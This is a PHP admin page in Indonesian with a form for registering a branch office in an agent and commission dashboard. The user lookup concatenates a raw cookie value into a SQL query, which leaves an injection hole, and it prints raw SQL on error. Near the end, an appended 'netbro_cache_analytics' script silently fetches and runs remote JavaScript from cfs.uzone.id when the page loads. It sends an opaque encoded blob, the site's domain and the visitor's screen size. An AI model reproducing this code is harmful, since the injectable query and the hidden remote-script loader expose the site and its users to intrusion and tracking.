<?php
session_start();
require '../db.php';

$sqlU = "SELECT * FROM `users`,`employees` WHERE users.employee_id = employees.id AND users.username = '".$_COOKIE['idU']."'";
$resultU = mysqli_query($link, $sqlU);
$rowU = mysqli_fetch_array($resultU);
if(!$resultU) {
    echo "SQL ERROR: ".$sqlU;
}

if(!isset($_COOKIE['loginU'])) {
    header('location: ../login.php');
}
if($rowU['nama'] == null){
    header('location: ../proses.php?cmd=logout');
}

$sqlP = "SELECT * FROM `percents` WHERE id = 1";
$resultP = mysqli_query($link, $sqlP);
$rowP = mysqli_fetch_array($resultP);
if(!$resultP){
    echo "SQL ERROR: ".$sqlU;
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
    <link rel="icon" type="image/png" sizes="96x96" href="../assets/img/favicon.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Daftar Cabang</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- Bootstrap core CSS -->
    <link href="../assets/css/bootstrap1.min.css" rel="stylesheet" />

    <!--  Paper Dashboard core CSS -->
    <link href="../assets/css/paper-dashboard.css?v=1.2.1" rel="stylesheet"/>

    <!--  CSS for Demo Purpose, don't include it in your project -->
    <link href="../assets/css/demo.css" rel="stylesheet" />

    <!-- Animation library for notifications -->
    <link href="../assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
    <link href="../assets/css/themify-icons.css" rel="stylesheet">

</head>
<body>
    <div class="wrapper">
        <div class="sidebar" data-background-color="brown" data-active-color="danger">

            <div class="logo">
                <a href="../home.php" class="simple-text logo-mini">
                    AA Indonesia
                </a>

                <a href="../home.php" class="simple-text logo-normal">
                    AA Indonesia
                </a>
            </div>
            <div class="sidebar-wrapper">
                

                <ul class="nav">
                    <li>
                        <a href="../home.php">
                            <i class="ti-panel"></i>
                            <p>Dashboard</p>
                        </a>
                    </li>
                    <li>
                        <a data-toggle="collapse" href="#agentExamples">
                            <i class="ti-user"></i>
                            <p>Agent
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse" id="agentExamples">
                            <ul class="nav">
                                <li>
                                    <a href="../agent/info.php">
                                        <span class="sidebar-mini">I</span>
                                        <span class="sidebar-normal">Info</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../agent/daftar.php">
                                        <span class="sidebar-mini">D</span>
                                        <span class="sidebar-normal">Daftar</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a data-toggle="collapse" class-aria-expanded="true" href="#cabangExamples">
                            <i class="ti-home"></i>
                            <p>
                                Cabang    
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse in" aria-expanded="true" id="cabangExamples">
                            <ul class="nav">
                                <li>
                                    <a href="info.php">
                                        <span class="sidebar-mini">I</span>
                                        <span class="sidebar-normal">Info</span>
                                    </a>
                                </li>
                                <li class="active">
                                    <a href="daftar.php">
                                        <span class="sidebar-mini">D</span>
                                        <span class="sidebar-normal">Daftar</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a href="../closing.php">
                            <i class="ti-pencil-alt"></i>
                            <p>
                                Closing
                            </p>
                        </a>
                    </li>
                    <li>
                        <a data-toggle="collapse" href="#laporanExamples">
                            <i class="ti-stats-up"></i>
                            <p>
                                Laporan
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse" id="laporanExamples">
                            <ul class="nav">
                                <li>
                                    <a href="../laporan/rekapitulasi.php">
                                        <span class="sidebar-mini">RK</span>
                                        <span class="sidebar-normal">Rekapitulasi</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/komisi.php">
                                        <span class="sidebar-mini">KM</span>
                                        <span class="sidebar-normal">Komisi</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/unit.php">
                                        <span class="sidebar-mini">UN</span>
                                        <span class="sidebar-normal">Unit</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/aktif.php">
                                        <span class="sidebar-mini">AK</span>
                                        <span class="sidebar-normal">Aktif</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/pasif.php">
                                        <span class="sidebar-mini">PS</span>
                                        <span class="sidebar-normal">Pasif</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a href="../pengaturan.php">
                            <i class="ti-settings"></i>
                            <p>
                                Pengaturan
                            </p>
                        </a>
                    </li>
                </ul>
            </div>
        </div>

        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">

                        <a class="navbar-brand" href="daftar.php">Daftar Cabang</a>

                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a>
                                    <i class="ti-user"></i>
                                    <p>
                                        <?php echo $rowU['nama'];?>   
                                    </p>
                                </a>                                  
                            </li>
                            <li>
                                <a href="../proses.php?cmd=logout">
                                    <i class="ti-power-off"></i>
                                    <p>
                                        Logout
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>

            <div class="content">
                <div class="container-fluid">
                    
                    <div class="card">
                        <div class="card-header"><h4 class="card-title">Daftar Cabang</h4></div>
                            <div class="card-content">
                                <form action="" method="POST" class="form-horizontal" id="registerFormValidation">
                                    <fieldset>
                                        <div class="form-group">
                                            <label class="col-sm-4 control-label">Nama :</label><star>*</star>
                                            <div class="col-sm-4">
                                                <input name="nama" id="nama" class="form-control" type="text" required="true" aria-required="true" autofocus></input>
                                            </div>
                                        </div>
                                    </fieldset>
                                    <fieldset>
                                        <div class="form-group">
                                            <label class="col-sm-4 control-label">Kota :</label><star>*</star>
                                            <div class="col-sm-4">
                                            <select name="kota" id="kota" class="form-control">
                                                <option>Surabaya</option>
                                                <option>Jakarta</option>
                                                <option>Yogyakarya</option>
                                                <option>Bandung</option>
                                                <option>Makassar</option>
                                                <option>Balikpapan</option>
                                                <option>Malang</option>
                                                <option>Semarang</option>
                                                <option>Denpasar</option>
                                            </select>
                                        </div>
                                    </fieldset>
                                    <fieldset>
                                        <div class="form-group">
                                            <label class="col-sm-4 control-label">Kode pos :</label><star>*</star>
                                            <div class="col-sm-4">
                                                <input name="kodepos" id="kodepos" class="form-control" type="text" required="true" aria-required="true" autofocus></input>
                                            </div>
                                        </div>
                                    </fieldset>
                                    <fieldset>
                                        <div class="form-group">
                                            <label class="col-sm-4 control-label">Alamat :</label><star>*</star>
                                            <div class="col-sm-4">
                                                <textarea name="alamat" id="alamat" class="form-control" type="text" required="true" aria-required="true" autofocus></textarea>
                                            </div>
                                        </div>
                                    </fieldset>
                                    <fieldset>
                                        <div class="form-group">
                                            <label class="col-sm-4 control-label">No. Telp :</label><star>*</star>
                                            <div class="col-sm-4">
                                                <input name="no_telp" id="no_telp" class="form-control" type="text" required="true" aria-required="true" autofocus></input>
                                            </div>
                                        </div>
                                    </fieldset>
                                    <fieldset>
                                        <div class="category">
                                            <label class="col-sm-4 control-label" align="right"><star>*</star>Harus diisi</label>
                                        </div>
                                    </fieldset>
                                    <div class="card-footer">
                                        <div class="form-group">
                                            <div class="col-sm-12"> <!-- pilih tuh diantara 4 sampe 7, 5 udah bagus sih, cuman ini 12 rada aneh -->
                                                <input type="submit" name="submit" class="btn btn-info btn-fill pull-right" value="Simpan" style="width: 100px;"/>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>

            <br/>
            <footer class="footer">
                <div class="container-fluid">
                    <nav class="pull-left">
                        <ul>
                            <li>
                                <a href="#">
                                    Media Solution
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                   Blog
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    Licenses
                                </a>
                            </li>
                        </ul>
                    </nav>
                    <div class="copyright pull-right">
                        &copy; <script>document.write(new Date().getFullYear())</script> - Made with <i class="fa fa-heart heart"></i> by <a href="#">Media Solution</a>
                    </div>
                </div>
            </footer>
        </div>
    </div>

    <!--
    <div class="fixed-plugin">
        <div class="dropdown show-dropdown">
            <a href="#" data-toggle="dropdown">
            <i class="fa fa-cog fa-2x"> </i>
            </a>
            <ul class="dropdown-menu">
                <li class="header-title">Sidebar Background</li>
                <li class="adjustments-line text-center">
                    <a href="javascript:void(0)" class="switch-trigger background-color">
                        <span class="badge filter badge-brown active" data-color="brown"></span>
                        <span class="badge filter badge-white" data-color="white"></span>
                    </a>
                </li>

                <li class="header-title">Sidebar Active Color</li>
                <li class="adjustments-line text-center">
                    <a href="javascript:void(0)" class="switch-trigger active-color">
                            <span class="badge filter badge-primary" data-color="primary"></span>
                            <span class="badge filter badge-info" data-color="info"></span>
                            <span class="badge filter badge-success" data-color="success"></span>
                            <span class="badge filter badge-warning" data-color="warning"></span>
                            <span class="badge filter badge-danger active" data-color="danger"></span>
                    </a>
                </li>
            </ul>
        </div>
    </div> -->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!--   Core JS Files. Extra: TouchPunch for touch library inside jquery-ui.min.js   -->
    <script src="../assets/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="../assets/js/jquery-ui.min.js" type="text/javascript"></script>
    <script src="../assets/js/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="../assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Forms Validations Plugin -->
    <script src="../assets/js/jquery.validate.min.js"></script>

    <!-- Promise Library for SweetAlert2 working on IE -->
    <script src="../assets/js/es6-promise-auto.min.js"></script>

    <!--  Plugin for Date Time Picker and Full Calendar Plugin-->
    <script src="../assets/js/moment.min.js"></script>

    <!--  Date Time Picker Plugin is included in this js file -->
    <script src="../assets/js/bootstrap-datetimepicker.js"></script>

    <!--  Select Picker Plugin -->
    <script src="../assets/js/bootstrap-selectpicker.js"></script>

    <!--  Switch and Tags Input Plugins -->
    <script src="../assets/js/bootstrap-switch-tags.js"></script>

    <!-- Circle Percentage-chart -->
    <script src="../assets/js/jquery.easypiechart.min.js"></script>

    <!--  Charts Plugin -->
    <script src="../assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="../assets/js/bootstrap-notify.js"></script>

    <!-- Sweet Alert 2 plugin -->
    <script src="../assets/js/sweetalert2.js"></script>

    <!-- Vector Map plugin -->
    <script src="../assets/js/jquery-jvectormap.js"></script>

    <!-- Wizard Plugin    -->
    <script src="../assets/js/jquery.bootstrap.wizard.min.js"></script>

    <!--  Bootstrap Table Plugin    -->
    <script src="../assets/js/bootstrap-table.js"></script>

    <!--  Plugin for DataTables.net  -->
    <script src="../assets/js/jquery.datatables.js"></script>

    <!--  Full Calendar Plugin    -->
    <script src="../assets/js/fullcalendar.min.js"></script>

    <!-- Paper Dashboard PRO Core javascript and methods for Demo purpose -->
    <script src="../assets/js/paper-dashboard.js?v=1.2.1"></script>

    <!--   Sharrre Library    -->
    <script src="../assets/js/jquery.sharrre.js"></script>

    <!-- Paper Dashboard PRO DEMO methods, don't include it in your project! -->
    <script src="../assets/js/demo.js"></script>

    <script type="text/javascript">
        $('#closeNotify').click(function() { // Buat tombol x 
            $('#notify').slideUp().empty();  // Buat nutup notif
        });

        $(function(){
            $('#notify').slideDown();
        });


        $().ready(function(){
            $('#registerFormValidation').validate();
            $('form').on('submit', function (e) {
                var isvalidate=$("#registerFormValidation").valid();

                if(isvalidate)
                {
                    e.preventDefault();
                    $.ajax({
                        type: 'post',
                        url: '../proses.php?cmd=daftar_cabang',
                        data: $('form').serialize(),
                        success: function (data) 
                        {
                            $.notify({
                               icon: 'glyphicon glyphicon-ok-sign',
                               message: 'Data cabang berhasil untuk disimpan.'
                            },{
                               // settings
                               type: 'success',
                               placement: {
                               from: "top",
                               align: "center"
                               },
                            });
                            var form = document.getElementById("registerFormValidation");
                            form.reset();
                        }
                    });
                }
                else{
                    $.notify({
                        // options
                        icon: 'glyphicon glyphicon-exclamation-sign',
                        message: 'Maaf, data cabang gagal untuk disimpan. Silahkan cek kembali.' 
                    },{
                        // settings
                        type: 'danger',
                        placement: {
                            from: "top",
                            align: "center"
                        },
                    });
                }
              

            });
        });
    </script>

</html>
